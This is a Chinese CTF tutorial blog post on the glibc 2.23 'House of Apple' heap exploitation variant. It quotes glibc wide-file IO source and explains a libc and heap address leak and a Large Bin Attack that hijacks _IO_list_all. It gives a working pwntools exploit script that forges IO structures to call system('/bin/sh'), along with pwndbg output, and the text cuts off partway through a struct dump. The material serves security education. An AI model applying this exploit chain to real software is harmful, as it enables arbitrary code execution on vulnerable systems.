---
layout: post
title: 【pwn4heap】pwn4heap - glibc2.23其十二
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# pwn4heap - glibc2.23其十二

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-41 house of apple其八

在glibc 2.24及后续版本实施严格的`_IO_FILE_plus`虚表范围检查后，发展出了多种绕过技术。其中，**House of Apple**的一个特定变体通过**将堆漏洞的任意地址写能力，与glibc内合法的宽字符文件IO跳转表（`_IO_wfile_jumps`及其变体）相结合**，并利用`_IO_codecvt`结构中一个相对隐蔽的函数指针项，构建了一条能够通过所有验证的完整利用链。该方法的核心在于操控文件同步路径，直接触发字符编码查询函数以执行任意代码。

完整的利用流程可清晰地划分为以下三个逻辑阶段：

**第一阶段：建立利用基础——获取任意地址写原语**
首要步骤是利用堆漏洞（例如经典的**Large Bin Attack**）获取一次**向任意地址写入可控数据**的关键能力。此原语的主要目的是劫持全局IO流管理体系，典型操作是向全局变量`_IO_list_all`写入一个可控的堆内存地址，从而为后续所有利用步骤创造条件。

**第二阶段：构造恶意环境——伪造IO结构并劫持全局链表**
利用获得的写能力，对IO子系统执行以下核心操作以构建利用环境：
1.  **劫持全局IO链表头**：将管理所有文件流的全局指针`_IO_list_all`，修改为指向堆上预先布置的伪造`_IO_FILE_plus`结构。
2.  **设置合法虚表以通过验证**：**（此技术的核心绕过机制）** 在该伪造结构中，将其虚表（vtable）指针设置为glibc内部合法的 **`_IO_wfile_jumps``或`_IO_wfile_jumps_mmap`或`_IO_wfile_jumps_maybe_mmap`** 地址之一。这些地址均位于libc认可的合法vtable内存区域，因此能通过严格的范围检查。
3.  **布置完整的伪造数据结构链**：精确设置伪造结构中的各个字段，以精确操控后续执行逻辑：
    *   将`_IO_FILE_plus`结构内的`_codecvt`指针指向一个伪造的`_IO_codecvt`结构。**这是整个利用链的最终执行触发点**。在该伪造结构中：
        *   将 **`__codecvt_do_encoding`** 函数指针项设置为最终的利用目标地址（如`system`）。
        *   将 **`__codecvt_destr`** 指针项设置为字符串`“/bin/sh”`，为`system`调用提供参数。
    *   精确设置`_mode`、`_IO_write_base`、`_IO_write_ptr`等状态字段，以满足从`_IO_flush_all_lockp`到`_IO_wfile_sync`的路径检查，确保控制流不被中断。

**第三阶段：触发利用链——引导同步路径直接执行代码**
最终，当程序因调用`abort()`、`exit()`或触发堆错误处理（如`malloc_printerr`）而执行`_IO_flush_all_lockp`函数时，该函数会遍历被污染的IO链表。对于链表中伪造的文件流，其`_IO_OVERFLOW`函数指针实际指向`_IO_wfile_jumps`表中的 **`_IO_wfile_sync`** 函数。

控制流进入`_IO_wfile_sync`后，在特定执行路径中，为查询或设置字符编码，会调用与该文件流关联的`_codecvt`结构中的对应函数，即执行 **`(*cv->__codecvt_do_encoding) (cv)`** 调用。

由于此前已完全控制该`_IO_codecvt`结构，并将`__codecvt_do_encoding`设置为`system`地址，同时`__codecvt_destr`指向`“/bin/sh”`，此调用即被转化为 **`system(“/bin/sh”)`** 的执行，从而成功获取shell，完成任意代码执行。此变体通过触发编码查询这一相对“冷门”的操作，实现了从文件同步到代码执行的简洁转换。

相关glibc完整源码参见[wfileops.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/wfileops.c#L516)：

```c
const struct _IO_jump_t _IO_wfile_jumps =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
libc_hidden_data_def (_IO_wfile_jumps)


const struct _IO_jump_t _IO_wfile_jumps_mmap =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_mmap),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf_mmap),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close_mmap),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

const struct _IO_jump_t _IO_wfile_jumps_maybe_mmap =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_maybe_mmap),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf_mmap),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

struct _IO_codecvt
{
  void (*__codecvt_destr) (struct _IO_codecvt *);
  enum __codecvt_result (*__codecvt_do_out) (struct _IO_codecvt *,
					     __mbstate_t *,
					     const wchar_t *,
					     const wchar_t *,
					     const wchar_t **, char *,
					     char *, char **);
  enum __codecvt_result (*__codecvt_do_unshift) (struct _IO_codecvt *,
						 __mbstate_t *, char *,
						 char *, char **);
  enum __codecvt_result (*__codecvt_do_in) (struct _IO_codecvt *,
					    __mbstate_t *,
					    const char *, const char *,
					    const char **, wchar_t *,
					    wchar_t *, wchar_t **);
  int (*__codecvt_do_encoding) (struct _IO_codecvt *);
  int (*__codecvt_do_always_noconv) (struct _IO_codecvt *);
  int (*__codecvt_do_length) (struct _IO_codecvt *, __mbstate_t *,
			      const char *, const char *, _IO_size_t);
  int (*__codecvt_do_max_length) (struct _IO_codecvt *);

  _IO_iconv_t __cd_in;
  _IO_iconv_t __cd_out;
};

struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};

wint_t
_IO_wfile_sync (_IO_FILE *fp)
{
  _IO_ssize_t delta;
  wint_t retval = 0;

  /*    char* ptr = cur_ptr(); */
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if (_IO_do_flush (fp))
      return WEOF;
  delta = fp->_wide_data->_IO_read_ptr - fp->_wide_data->_IO_read_end;
  if (delta != 0)
    {
      /* We have to find out how many bytes we have to go back in the
	 external buffer.  */
      struct _IO_codecvt *cv = fp->_codecvt;
      _IO_off64_t new_pos;

      int clen = (*cv->__codecvt_do_encoding) (cv);

      if (clen > 0)
	/* It is easy, a fixed number of input bytes are used for each
	   wide character.  */
	delta *= clen;
      else
	{
	  /* We have to find out the hard way how much to back off.
	     To do this we determine how much input we needed to
	     generate the wide characters up to the current reading
	     position.  */
	  int nread;

	  fp->_wide_data->_IO_state = fp->_wide_data->_IO_last_state;
	  nread = (*cv->__codecvt_do_length) (cv, &fp->_wide_data->_IO_state,
					      fp->_IO_read_base,
					      fp->_IO_read_end, delta);
	  fp->_IO_read_ptr = fp->_IO_read_base + nread;
	  delta = -(fp->_IO_read_end - fp->_IO_read_base - nread);
	}

      new_pos = _IO_SYSSEEK (fp, delta, 1);
      if (new_pos != (_IO_off64_t) EOF)
	{
	  fp->_wide_data->_IO_read_end = fp->_wide_data->_IO_read_ptr;
	  fp->_IO_read_end = fp->_IO_read_ptr;
	}
#ifdef ESPIPE
      else if (errno == ESPIPE)
	; /* Ignore error from unseekable devices. */
#endif
      else
	retval = WEOF;
    }
  if (retval != WEOF)
    fp->_offset = _IO_pos_BAD;
  /* FIXME: Cleanup - can this be shared? */
  /*    setg(base(), ptr, ptr); */
  return retval;
}
libc_hidden_def (_IO_wfile_sync)
```

本方法的成功执行，依赖于 glibc 内部一条从堆错误处理到文件流同步的确定性路径。通过触发堆分配器错误（例如双重释放一个已位于 large bin 中的内存块），引导程序调用 **`malloc_printerr`** 函数。该函数在准备输出错误信息时，会调用 **`_IO_flush_all_lockp`** 以强制刷新所有已注册的 IO 流。

`_IO_flush_all_lockp` 函数遍历由全局指针 `_IO_list_all` 管理的 IO 链表，并对其中每个文件流调用其虚表 (vtable) 中定义的 **`_IO_OVERFLOW`** 函数。由于利用链已通过 Large Bin Attack 将 `_IO_list_all` 劫持，并插入了一个虚表设置为 **`_IO_wfile_jumps`** 的伪造 `_IO_FILE_plus` 结构，因此实际被调用的 `_IO_OVERFLOW` 函数即为该表中的 **`_IO_wfile_sync`**。

**完整的控制流路径如下：**

1.  **`malloc_printerr`**：堆错误处理的入口，触发 IO 流刷新。
2.  **`_IO_flush_all_lockp`**：遍历 IO 链表，对每个流调用其 `_IO_OVERFLOW`。
3.  **`_IO_OVERFLOW` (即 `_IO_wfile_sync`)**：这是 `_IO_wfile_jumps` 虚表中 `_IO_OVERFLOW` 项的实现，负责执行宽字符文件流的同步操作。它将控制流导向实际的刷新逻辑。
4.  **`__codecvt_do_encoding`**：
    *   **正常作用**：这是 `_IO_codecvt` 结构体中的一个函数指针，本意用于执行字符编码的查询或设置，属于字符集转换模块的一部分。
    *   **在利用中的角色**：**这是整个利用链的最终跳转点**。在 `_IO_wfile_sync` 函数的执行路径中，为查询或设置宽字符流的编码属性，会调用关联的 `_codecvt` 结构中的此函数，即执行 **`(*cv->__codecvt_do_encoding) (cv)`**。通过前期布局，已完全控制了伪造的 `_IO_codecvt` 结构，并将此 **`__codecvt_do_encoding`** 指针设置为目标函数地址（如 `system`）。同时，将同一结构中的 `__codecvt_destr` 指针设置为字符串 `“/bin/sh”`。因此，该调用实际执行的是 `system(cv)`。由于 `cv` 指针指向的结构起始处包含 `__codecvt_destr` 指针并指向 `“/bin/sh”`，此调用即等效于 **`system(“/bin/sh”)`**。

**总结利用链**：

**`malloc_printerr` → `_IO_flush_all_lockp` → `_IO_OVERFLOW` (`_IO_wfile_sync`) → `__codecvt_do_encoding` (`system`)**。

通过精心构造 IO 结构并劫持该链条，从而将一次堆管理器错误处理，转化为对任意命令的可靠执行。此变体通过触发编码查询这一相对简洁的路径，实现了从文件同步到代码执行的直接转换。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_apple_eight/exploit.py)。

核心利用代码如下：

```python
# house of apple eight
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
log.info(f"_IO_wfile_jumps addr: {hex(_IO_wfile_jumps)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_IO_list_all - 0x10)
payload += p64(chunk0_addr) + p64(_IO_list_all - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

fake_wide_data = p64(0xFFFFFFFFFFFFFFFF) + p64(2)
fake_wide_data = fake_wide_data.ljust(0x18, b"\x00") + p64(3)
fake_wide_data = fake_wide_data.ljust(0x20, b"\x00") + p64(2)
payload = b"\x00" * 0x20 + fake_wide_data
fake_codecvt = b"/bin/sh\x00"
fake_codecvt = fake_codecvt.ljust(0x20, b"\x00") + p64(system)
payload = payload.ljust(0x200 - 0x10, b"\x00") + fake_codecvt
edit(0, len(payload), payload)

fake_io = p64(0)
fake_io = fake_io.ljust(0x20 - 0x10, b"\x00") + p64(2)
fake_io = fake_io.ljust(0x28 - 0x10, b"\x00") + p64(3)
fake_io = fake_io.ljust(0x98 - 0x10, b"\x00") + p64(chunk0_addr + 0x200)
fake_io = fake_io.ljust(0xA0 - 0x10, b"\x00") + p64(chunk0_addr + 0x30)
fake_io = fake_io.ljust(0xC0 - 0x10, b"\x00") + p64(0)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_wfile_jumps + 0x48)
edit(2, len(fake_io), fake_io)
delete(0)
conn.recvline()
cmd = b"cat src/2.23/house_of_apple_eight/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在堆漏洞利用的早期阶段，精确获取目标进程的内存映射信息是至关重要的先决条件。一种被广泛采用的高效技术是通过诱导一个空闲堆块在glibc分配器的不同管理容器间迁移，利用其元数据指针的变化来窃取地址。具体来说，操纵一个堆块从**unsorted bin**转移到**large bin**，可以利用后者特有的指针布局，一次性泄露**libc的基地址**和**堆区域的起始地址**。

**完整的操作步骤与底层机制如下：**

1.  **初始化内存状态**
    程序首先依次分配三个堆内存块，标记为`chunk[0]`、`chunk[1]`和`chunk[2]`。`chunk[1]`的关键角色是作为物理屏障，确保`chunk[0]`与`chunk[2]`在内存中不直接相邻，从而防止它们在后续操作中意外合并。一个重要的前提是设定`chunk[0]`的尺寸大于`chunk[2]`的尺寸，这保证了`chunk[0]`足够大，能够满足后续被large bin收纳的条件（通常指尺寸不小于1024字节）。

2.  **将目标块送入Unsorted Bin以植入管理指针**
    接着释放`chunk[0]`。由于其尺寸超出了fast bin的管辖范围且不与top chunk毗邻，它会被放入**unsorted bin**——一个暂存空闲块的双向循环链表。此时，分配器将`chunk[0]`的`fd`（前向）和`bk`（后向）指针覆写，指向glibc的全局管理结构`main_arena`内部的一个已知位置（例如`main_arena+88`）。这个地址与libc的加载基址之间存在一个固定的、可计算的偏移。

3.  **通过内存分配诱导块向Large Bin转移**
    随后，程序发起一次新的内存分配请求，申请一个尺寸大于`chunk[0]`的新堆块`chunk[3]`。由于unsorted bin中唯一的块`chunk[0]`无法满足这次较大的请求，分配器会对其执行整理。鉴于其较大的尺寸，`chunk[0]`被从unsorted bin中取出，并依据其大小归类，插入到对应的**large bin**链表中。

4.  **捕获Large Bin中的特殊元数据实现双重泄露**
    在large bin链表中，每个空闲块除了维护用于常规双向链表遍历的`fd`和`bk`指针外，还包含一对特殊的`fd_nextsize`和`bk_nextsize`指针，用于在不同大小的块之间进行快速跳转。当`chunk[0]`被置入一个**空的large bin**，或成为其所在尺寸范围内的 **第一个块**时，其`fd_nextsize`和`bk_nextsize`指针会被初始化为指向其自身的堆内存地址。因此，此刻`chunk[0]`的元数据中并存着两类至关重要的指针：
    *   `fd`与`bk`：指向`main_arena`结构内部的地址（**可用于推算libc基址**）。
    *   `fd_nextsize`与`bk_nextsize`：指向`chunk[0]`自身的地址（**即堆内存地址**）。

5.  **提取并计算以获取关键布局信息**
    最后，利用程序可能提供的读功能（例如`show(0)`）输出已被释放的`chunk[0]`用户数据区的内容。由于该块当前处于空闲状态，其用户数据区的起始部分已被上述管理指针覆盖。从输出中可以同步解析出：
    *   从`fd`或`bk`的值推算出`main_arena`的地址，减去已知的固定偏移即可得到**libc的基址**。
    *   从`fd_nextsize`或`bk_nextsize`的值可直接得到**该堆块所在的堆内存地址**。

通过这一系列模拟了正常内存分配与释放行为的精巧操作，在无需任何初始地址信息的情况下，就能同时获取后续利用链所依赖的两个基石：libc基址和堆内存布局。这为紧接着实施诸如**Large Bin Attack**等关键利用步骤，以劫持全局数据结构，奠定了不可或缺的基础。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x60fcdd65a000
Size: 0x430 (with flag bits: 0x431)
fd: 0x7b7c2a38df68
bk: 0x7b7c2a38df68
fd_nextsize: 0x60fcdd65a000
bk_nextsize: 0x60fcdd65a000

Allocated chunk
Addr: 0x60fcdd65a430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x60fcdd65a940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x60fcdd65ad50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x60fcdd65b260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x60fcdd65a000 —▸ 0x7b7c2a38df68 (main_arena+1096) ◂— 0x60fcdd65a000
pwndbg> 
```

在成功获取关键的libc与堆内存地址后，利用流程进入**主动构造阶段**。下一步是运用**Large Bin Attack**这一强大原语，通过单次堆分配操作实现**两次独立的任意地址写**，从而将获取的地址信息转化为对关键全局内存的实质性控制，为后续的利用链奠定基础。

**具体的利用步骤、操作与内在机制如下：**

**第一阶段：准备利用载体与污染元数据**
1.  **准备“载体”块**：释放预留的`chunk[2]`。由于其尺寸适中，它被置入**unsorted bin**，成为后续链表操作中将被转移的“载体”（victim）。
2.  **污染Large Bin指针**：利用已获得的堆上任意写能力，精确修改仍位于**large bin**中的`chunk[0]`的两个关键后向指针，将其指向利用目标：
    *   将`bk`指针修改为`_IO_list_all - 0x10`，旨在劫持全局IO流链表头。
    *   将`bk_nextsize`指针修改为`target2`（例如`_IO_list_all - 0x20`或`global_max_fast`），用于向第二个选定的目标地址写入。

**第二阶段：触发分配以执行双重写入**
3.  **通过特定分配触发利用**：程序申请一个较大的新堆块`chunk[4]`，其大小必须**同时大于`chunk[2]`和`chunk[0]`的尺寸**。此条件迫使分配器无法直接满足请求，必须对unsorted bin进行整理。
4.  **触发并完成双重写入**：在整理过程中，分配器会将`chunk[2]`（victim）从unsorted bin中取出，并尝试按其大小插入`chunk[0]`所在的large bin链表。**此插入操作会触发分配器执行两次关键的链表维护写入**，这是利用的核心：
    *   **第一次写入（劫持`_IO_list_all`）**：执行链表操作`victim->bk->fd = victim`。由于`victim->bk`已被篡改为`_IO_list_all - 0x10`，此操作的实际效果是向 **`*_IO_list_all`** 写入`victim`（即`chunk[2]`）的堆地址。
    *   **第二次写入（污染辅助目标）**：执行链表操作`victim->bk_nextsize->fd_nextsize = victim`。由于`victim->bk_nextsize`指向`target2`，此操作向 **`*(target2 + 0x20)`** 写入了`victim`的堆地址。

**利用达成的效果**：
至此，一次精心布局的Large Bin Attack成功实现了双重控制效果：
1.  **核心劫持**：全局IO链表头指针`_IO_list_all`被成功劫持，指向可控的堆内存（`chunk[2]`）。这使得后续可以完全控制IO链表的遍历起点，为伪造恶意`_IO_FILE`结构并最终劫持控制流创造了决定性条件。
2.  **辅助破坏**：在第二个可控目标地址（`target2 + 0x20`）植入了一个堆地址。通过灵活选择`target2`（例如设为`global_max_fast`），可以扰乱堆分配器的行为，为整个利用链提供额外的操作空间或破坏能力。

此步骤标志着利用从被动的信息收集与验证阶段，正式迈入了主动篡改关键全局数据结构、构建恶意执行环境的实质性利用阶段。

```bash
pwndbg> x/1gx &_IO_list_all
0x7b7c2a38e540 <__GI__IO_list_all>:     0x000060fcdd65a940
pwndbg> x/10gx chunks
0x60fca47fb060 <chunks>:        0x0000000000000020      0x000060fcdd65a010
0x60fca47fb070 <chunks+16>:     0x0000000000000500      0x000060fcdd65a440
0x60fca47fb080 <chunks+32>:     0x0000000000000400      0x000060fcdd65a950
0x60fca47fb090 <chunks+48>:     0x0000000000000500      0x000060fcdd65ad60
0x60fca47fb0a0 <chunks+64>:     0x0000000000000500      0x000060fcdd65b270
pwndbg> 
```

在成功将`_IO_list_all`全局指针劫持为指向`chunk[2]`后，需要在`chunk[2]`的用户数据区精心伪造一个 **`_IO_FILE_plus`** 结构体。其中，以下几个关键字段的精确设置，是引导后续IO处理流程按预定路径执行的决定性因素：

**核心字段的设置与利用目的：**

1.  **设置`_mode`字段**：将其明确赋值为`0`。这标识该伪造文件流为一个面向字节（窄字符）的流，使其满足后续条件判断中关于`_mode`的要求。

2.  **设置`_IO_write_ptr`与`_IO_write_base`字段**：将`_IO_write_ptr`设置为`3`，`_IO_write_base`设置为`2`。

**利用逻辑与路径引导：**

以上设置的**核心目的**在于满足 **`_IO_flush_all_lockp`** 函数内部的一个关键复合条件判断。该函数在遍历IO链表时，会检查每个文件流的状态，以决定是否需要调用其`_IO_OVERFLOW`函数来刷新缓冲区。相关的条件为：
`if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) ... )`

*   由于`_mode=0`，满足`_mode <= 0`的条件。
*   由于`_IO_write_ptr (3) > _IO_write_base (2)`，该子条件也成立。

因此，**整个条件判断为真**。这导致`_IO_flush_all_lockp`函数认定此伪造流存在未刷新的输出数据，从而通过其虚表（vtable）调用该流的 **`_IO_OVERFLOW`** 函数。

由于在伪造`_IO_FILE_plus`结构时，已将其虚表指针设置为 **`_IO_wfile_jumps`**（或其变体），其`_IO_OVERFLOW`项实际指向该跳转表中的 **`_IO_wfile_sync`** 函数。因此，这次调用将控制流从通用的链表遍历函数，无缝导入我们预设的、针对宽字符（尽管`_mode`为0，但虚表属于宽字符系列，此为精心选择的矛盾路径）文件流的同步处理函数，为执行后续更复杂的利用链代码打开了大门。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)_IO_list_all
$1 = {
  file = {
    _flags = 0x0,
    _IO_read_ptr = 0x411,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x2,
    _IO_write_ptr = 0x3,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x60fcdd65a200,
    _wide_data = 0x60fcdd65a030,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x7b7c2a38c2a8
}
pwndbg> p/x *(struct _IO_jump_t*)0x7b7c2a38c2a8
$2 = {
  __dummy = 0x7b7c2a066d64,
  __dummy2 = 0x7b7c2a06d997,
  __finish = 0x7b7c2a06b2db,
  __overflow = 0x7b7c2a0677e1,
  __underflow = 0x7b7c2a061d6f,
  __uflow = 0x7b7c2a06bbf9,
  __pbackfail = 0x7b7c2a06bc56,
  __xsputn = 0x7b7c2a06b9c0,
  __xsgetn = 0x7b7c2a06b1f5,
  __seekoff = 0x7b7c2a06bc3d,
  __seekpos = 0x7b7c2a06e485,
  __setbuf = 0x7b7c2a06e48b,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x7b7c2a06810c,
  __stat = 0x7b7c2a065d8c,
  __showmanyc = 0x7b7c2a065d2d,
  __imbue = 0x7b7c2a0655fa
}
pwndbg> p/x &_IO_wfile_sync
$3 = 0x7b7c2a0677e1
pwndbg>
```

在可控的堆内存区域（例如 `chunk0_addr + 0x30`），需要为伪造的 `_IO_FILE_plus` 结构精心构造其关联的 **`_IO_wide_data`** 结构。其中几个关键字段的设置，旨在精确操控 `_IO_wfile_sync` 函数内部的执行路径，绕过所有可能提前结束的检查，并强制其进入调用目标函数指针的代码分支。

**字段设置、绕过逻辑与利用路径分析：**

1.  **设置 `_IO_write_ptr` 与 `_IO_write_base` 以绕过写入检查**：
    *   **赋值**：将 `_IO_write_ptr` 设为 `2`，`_IO_write_base` 设为 `3`。
    *   **利用目的**：在 `_IO_wfile_sync` 函数中，存在一个对宽字符输出缓冲区的检查：`if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)`。此条件若成立，表示有待写入的宽字符数据，可能会触发额外的处理或提前返回路径。通过**故意**将 `_IO_write_ptr` 设置为小于 `_IO_write_base`，我们使得该比较条件（`2 > 3`）**明确不成立**。这确保了执行流**不会**进入与“有待写入数据”相关的处理分支，从而绕过了一个可能导致流程复杂化或中断的检查点，使控制流得以继续向下执行，接近我们预设的目标。

2.  **设置 `_IO_read_ptr` 与 `_IO_read_end` 以强制触发编码转换调用**：
    *   **赋值**：将 `_IO_read_ptr` 设为极大值 `0xffffffffffffffff`，`_IO_read_end` 设为 `2`。
    *   **利用目的**：这是引导至最终代码执行的关键。在后续执行路径中，`_IO_wfile_sync` 函数会计算一个值 `delta = fp->_wide_data->_IO_read_ptr - fp->_wide_data->_IO_read_end;`。随后，它会检查 `if (delta != 0)`。
        *   由于 `_IO_read_ptr` (0xffffffffffffffff) 是一个极大的正数（或无符号数），而 `_IO_read_end` (2) 很小，两者相减的结果 `delta` 为一个**非常大的非零值**（在补码表示下可能是一个巨大的负数，但其值绝对不为0）。
        *   因此，条件 `if (delta != 0)` **恒成立**。这个条件的成立，是引导执行流进入特定分支的关键。在该分支中，函数为了处理这个“非零”的 `delta` 所代表的宽字符流状态，会调用关联的 `_codecvt` 结构中的 `__codecvt_do_encoding` 函数指针，即执行 **`(*cv->__codecvt_do_encoding) (cv);`**。

**总结**：通过对 `_IO_wide_data` 结构中这两对指针的“反常规”设置，实现了精密的路径控制：
*   **第一对指针** (`_IO_write_ptr` / `_IO_write_base`) 用于“避害”，通过使条件不成立来绕过一个无关或有害的执行分支。
*   **第二对指针** (`_IO_read_ptr` / `_IO_read_end`) 用于“趋利”，通过制造一个恒定的非零 `delta` 值，强制程序逻辑进入那个最终会调用我们可控函数指针 (`__codecvt_do_encoding`) 的代码块。

这标志着利用链已经突破了IO层所有的状态机检查，将一次对“缓冲区状态”的查询，转化为了此前预设的恶意函数（如 `system`）的可靠调用。

```bash
pwndbg> p/x *(struct _IO_wide_data*)0x60fcdd65a030
$4 = {
  _IO_read_ptr = 0xffffffffffffffff,
  _IO_read_end = 0x2,
  _IO_read_base = 0x0,
  _IO_write_base = 0x3,
  _IO_write_ptr = 0x2,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0x0,
    __value = {
